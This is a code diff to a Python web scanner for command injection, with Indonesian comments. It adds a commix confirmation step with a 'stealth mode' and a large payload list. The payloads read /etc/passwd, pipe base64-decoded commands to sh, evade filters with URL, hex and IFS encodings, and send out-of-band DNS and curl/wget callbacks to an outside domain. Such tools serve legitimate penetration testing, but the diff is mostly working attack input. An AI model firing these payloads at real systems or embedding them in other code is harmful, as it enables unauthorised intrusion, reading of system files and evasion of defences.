@@ -50,6 +50,122 @@ def command_injection_scanner(url: str, params: str = "") -> str:
         logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
         return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."
 
+    def _run_commix_confirmation(url: str, params: list, logger) -> dict:
+        """
+        Run commix sebagai confirmation step untuk command injection.
+        Return dict dengan is_confirmed, evidence, severity.
+        """
+        import subprocess
+        import tempfile
+        import os
+
+        tool_name = "CMDi Confirmation (commix)"
+        logger.add_log(tool_name, "PROCESSING", f"Running commix on {url}")
+
+        try:
+            # Create temp output file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+                output_file = f.name
+
+            # Run commix with batch mode
+            cmd = [
+                "commix",
+                "--url", url,
+                "--batch",
+                "--output", output_file,
+                "--timeout", "10",
+                "--level", "3",
+                "--risk", "2",
+            ]
+
+            # Apply stealth mode if enabled
+            if os.environ.get("STEALTH_MODE", "0") == "1":
+                cmd.extend([
+                    "--delay", "1",
+                    "--timeout", "30",
+                ])
+
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=120,  # 2 minute timeout
+            )
+
+            # Parse commix output
+            output = result.stdout + result.stderr
+
+            # Check for command injection indicators
+            cmdi_indicators = [
+                "is vulnerable",
+                "command injection",
+                "os-shell",
+                "payload:",
+                "back-end OS:",
+                "web server OS:",
+            ]
+
+            is_vulnerable = any(indicator.lower() in output.lower() for indicator in cmdi_indicators)
+
+            # Extract OS type if found
+            os_type = "Unknown"
+            os_indicators = ["Linux", "Windows", "Unix", "MacOS", "FreeBSD"]
+            for os_name in os_indicators:
+                if os_name.lower() in output.lower():
+                    os_type = os_name
+                    break
+
+            # Cleanup
+            try:
+                os.unlink(output_file)
+            except:
+                pass
+
+            if is_vulnerable:
+                evidence = output[:500]
+                logger.add_log(tool_name, "WARNING", f"commix CONFIRMED command injection ({os_type})")
+                return {
+                    "is_confirmed": True,
+                    "severity": "Critical",
+                    "os_type": os_type,
+                    "evidence": evidence,
+                    "tool": "commix",
+                }
+            else:
+                logger.add_log(tool_name, "INFO", "commix did not confirm command injection")
+                return {
+                    "is_confirmed": False,
+                    "severity": "Low",
+                    "tool": "commix",
+                    "note": "commix could not confirm vulnerability",
+                }
+
+        except subprocess.TimeoutExpired:
+            logger.add_log(tool_name, "WARNING", "commix timed out after 120s")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "commix",
+                "note": "commix execution timed out",
+            }
+        except FileNotFoundError:
+            logger.add_log(tool_name, "WARNING", "commix not found - skipping external confirmation")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "commix",
+                "note": "commix not installed",
+            }
+        except Exception as e:
+            logger.add_log(tool_name, "WARNING", f"commix error: {str(e)[:100]}")
+            return {
+                "is_confirmed": False,
+                "severity": "Low",
+                "tool": "commix",
+                "note": f"commix error: {str(e)[:100]}",
+            }
+
     domain = _domain_of(url)
     auth_kwargs = get_auth_kwargs(domain)
     param_list = [p.strip() for p in params.split(",")] if params else [
@@ -57,34 +173,140 @@ def command_injection_scanner(url: str, params: str = "") -> str:
         "search", "input", "data", "file", "path", "url", "q"
     ]
 
-    # Payloads: (payload, detection_type, expected_indicator)
+    # ── COMPREHENSIVE COMMAND INJECTION PAYLOADS ──────────────────────────────
+    # (payload, detection_type, expected_indicator, encoding)
     payloads = [
-        # Output-based
+        # ── OUTPUT-BASED (Linux) ───────────────────────────────────────────────
         (";id", "output", ["uid=", "gid=", "groups="]),
         ("|id", "output", ["uid=", "gid=", "groups="]),
         ("&&id", "output", ["uid=", "gid=", "groups="]),
         ("`id`", "output", ["uid=", "gid=", "groups="]),
         ("$(id)", "output", ["uid=", "gid=", "groups="]),
+        ("||id", "output", ["uid=", "gid=", "groups="]),
         (";whoami", "output", ["root", "www-data", "apache", "nginx"]),
         ("|whoami", "output", ["root", "www-data", "apache", "nginx"]),
-        # Windows
+        ("&&whoami", "output", ["root", "www-data", "apache", "nginx"]),
+        ("||whoami", "output", ["root", "www-data", "apache", "nginx"]),
+        ("$(whoami)", "output", ["root", "www-data", "apache", "nginx"]),
+        ("`whoami`", "output", ["root", "www-data", "apache", "nginx"]),
+        (";cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
+        ("|cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
+        ("&&cat /etc/passwd", "output", ["root:x:", "bin:x:"]),
+        ("$(cat /etc/passwd)", "output", ["root:x:", "bin:x:"]),
+        (";ls /etc", "output", ["passwd", "hosts", "shadow"]),
+        ("|ls /etc", "output", ["passwd", "hosts", "shadow"]),
+        (";uname -a", "output", ["linux", "GNU"]),
+        ("|uname -a", "output", ["linux", "GNU"]),
+        (";hostname", "output", ["."]),
+        ("|hostname", "output", ["."]),
+        (";id;whoami;uname -a", "output", ["uid=", "root", "linux"]),
+
+        # ── OUTPUT-BASED (Windows) ─────────────────────────────────────────────
         ("|whoami", "output", ["nt authority", "administrator"]),
         ("&whoami", "output", ["nt authority", "administrator"]),
-        # Time-based (blind)
+        ("&&whoami", "output", ["nt authority", "administrator"]),
+        ("||whoami", "output", ["nt authority", "administrator"]),
+        ("|type C:\\Windows\\System32\\drivers\\etc\\hosts", "output", ["localhost"]),
+        ("&type C:\\Windows\\System32\\drivers\\etc\\hosts", "output", ["localhost"]),
+        ("|dir C:\\", "output", ["windows", "program files"]),
+        ("&dir C:\\", "output", ["windows", "program files"]),
+        ("|hostname", "output", ["."]),
+        ("&hostname", "output", ["."]),
+
+        # ── ENCODING BYPASS PAYLOADS ───────────────────────────────────────────
+        # URL encoding
+        ("%3Bid", "output", ["uid=", "gid="]),
+        ("%7Cid", "output", ["uid=", "gid="]),
+        ("%26%26id", "output", ["uid=", "gid="]),
+        ("%3Buname%20-a", "output", ["linux", "GNU"]),
+
+        # Double encoding
+        ("%253Bid", "output", ["uid=", "gid="]),
+        ("%257Cid", "output", ["uid=", "gid="]),
+
+        # Unicode/binary encoding
+        ("\\x3bid", "output", ["uid=", "gid="]),
+        ("\\x7cid", "output", ["uid=", "gid="]),
+        ("\\x26\\x26id", "output", ["uid=", "gid="]),
+        ("\\x3buname\\x20-a", "output", ["linux", "GNU"]),
+
+        # Hex encoding
+        ("\\x3bid", "output", ["uid=", "gid="]),
+        ("0x3bid", "output", ["uid=", "gid="]),
+
+        # Base64 encoding (Linux)
+        (";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", "output", ["root:x:", "bin:x:"]),
+        ("|echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh", "output", ["root:x:", "bin:x:"]),
+        ("$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh)", "output", ["root:x:", "bin:x:"]),
+
+        # Space bypass
+        (";id${IFS}", "output", ["uid=", "gid="]),
+        ("|id${IFS}", "output", ["uid=", "gid="]),
+        (";cat${IFS}/etc/passwd", "output", ["root:x:", "bin:x:"]),
+        ("$IFS", "output", ["uid=", "gid="]),
+
+        # Newline injection
+        ("%0aid", "output", ["uid=", "gid="]),
+        ("%0d%0aid", "output", ["uid=", "gid="]),
+        ("\\n id", "output", ["uid=", "gid="]),
+        ("\\r\\n id", "output", ["uid=", "gid="]),
+
+        # ── TIME-BASED (BLIND) ─────────────────────────────────────────────────
         (";sleep 5", "time", []),
         ("|sleep 5", "time", []),
         ("&&sleep 5", "time", []),
-        ("& timeout /T 5", "time", []),  # Windows
-        # Language-specific RCE vectors
+        ("||sleep 5", "time", []),
+        ("$(sleep 5)", "time", []),
+        ("`sleep 5`", "time", []),
+        (";sleep%205", "time", []),
+        ("|sleep%205", "time", []),
+        ("&& sleep 5", "time", []),
+        ("; ping -c 5 127.0.0.1", "time", []),
+        ("| ping -c 5 127.0.0.1", "time", []),
+        ("&& ping -c 5 127.0.0.1", "time", []),
+        # Windows
+        ("& timeout /T 5", "time", []),
+        ("| timeout /T 5", "time", []),
+        ("&& timeout /T 5", "time", []),
+
+        # ── LANGUAGE-SPECIFIC RCE ──────────────────────────────────────────────
         (";php -r 'echo phpinfo();'", "output", ["php version", "php.ini"]),
+        ("|php -r 'echo phpinfo();'", "output", ["php version", "php.ini"]),
+        (";python -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
         ("|python -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
+        (";python3 -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
+        ("|python3 -c 'import os; print(os.popen(\"id\").read())'", "output", ["uid=", "gid="]),
+        (";node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'", "output", ["uid=", "gid="]),
         ("|node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'", "output", ["uid=", "gid="]),
+        (";ruby -e 'puts `id`'", "output", ["uid=", "gid="]),
         ("|ruby -e 'puts `id`'", "output", ["uid=", "gid="]),
+        (";perl -e 'print `id`'", "output", ["uid=", "gid="]),
         ("|perl -e 'print `id`'", "output", ["uid=", "gid="]),
+        (";java -version", "output", ["java version", "openjdk"]),
         ("|java -version", "output", ["java version", "openjdk"]),
-        # Blind RCE via DNS (OOB)
+        (";ruby --version", "output", ["ruby"]),
+        ("|ruby --version", "output", ["ruby"]),
+        (";perl --version", "output", ["perl"]),
+        ("|perl --version", "output", ["perl"]),
+        (";lua -v", "output", ["lua"]),
+        ("|lua -v", "output", ["lua"]),
+        (";tclsh <<< 'puts [exec id]'", "output", ["uid=", "gid="]),
+
+        # ── BLIND RCE VIA DNS (OOB) ───────────────────────────────────────────
         (";nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
         ("|nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("&&nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("||nslookup ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("$(nslookup ssrf-test.whoopbhapzham.my.id)", "oob", []),
+        ("`nslookup ssrf-test.whoopbhapzham.my.id`", "oob", []),
+        (";dig ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("|dig ssrf-test.whoopbhapzham.my.id", "oob", []),
+        (";host ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("|host ssrf-test.whoopbhapzham.my.id", "oob", []),
+        (";curl ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("|curl ssrf-test.whoopbhapzham.my.id", "oob", []),
+        (";wget ssrf-test.whoopbhapzham.my.id", "oob", []),
+        ("|wget ssrf-test.whoopbhapzham.my.id", "oob", []),
     ]
 
     vulnerabilities = []
@@ -173,6 +395,25 @@ def command_injection_scanner(url: str, params: str = "") -> str:
             }
         except Exception as e:
             logger.add_log(tool_name, "WARNING", f"OOB RCE test error: {str(e)[:100]}")
+
+    # ── COMMIX CONFIRMATION STEP ──────────────────────────────────────────────
+    if vulnerabilities:
+        commix_result = _run_commix_confirmation(url, param_list, logger)
+        if commix_result.get("is_confirmed"):
+            # Enhance existing findings with commix confirmation
+            for vuln in vulnerabilities:
+                vuln["commix_confirmed"] = True
+                vuln["commix_evidence"] = commix_result.get("evidence", "")
+                vuln["severity"] = "Critical"
+                logger.add_log(tool_name, "WARNING",
+                    f"commix CONFIRMED command injection")
+        else:
+            # Keep findings but mark as custom detection only
+            for vuln in vulnerabilities:
+                vuln["commix_confirmed"] = False
+                vuln["note"] = "Detected by custom scanner, not confirmed by commix"
+                logger.add_log(tool_name, "INFO",
+                    "commix did not confirm command injection - keeping as medium confidence")
 
     logger.add_log(tool_name, "SUCCESS", f"Command injection scan selesai. Found: {len(vulnerabilities)}")
     return json.dumps(result, indent=2)
